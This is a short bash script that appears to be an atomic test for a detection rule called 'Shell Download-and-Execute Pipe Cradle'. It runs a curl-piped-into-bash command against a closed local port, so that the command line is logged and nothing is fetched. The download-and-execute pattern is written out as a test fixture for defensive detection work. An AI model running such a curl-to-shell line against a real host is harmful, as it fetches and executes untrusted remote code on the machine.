#!/usr/bin/env bash
# Atomic test — rule 3e506273-8f91-42a4-8eb4-5f6071823405
#   "Shell Download-and-Execute Pipe Cradle"  (process_creation)
#
# Shell command line that fetches remote content and pipes it into an
# interpreter — the curl-into-shell cradle the rule keys on. curl targets a
# closed local port (--max-time bounds it), so the download fails and nothing is
# executed; the command line is what the rule detects.
set -u
bash -c 'curl -s --max-time 3 http://127.0.0.1:9/payload | bash' >/dev/null 2>&1 || true
exit 0
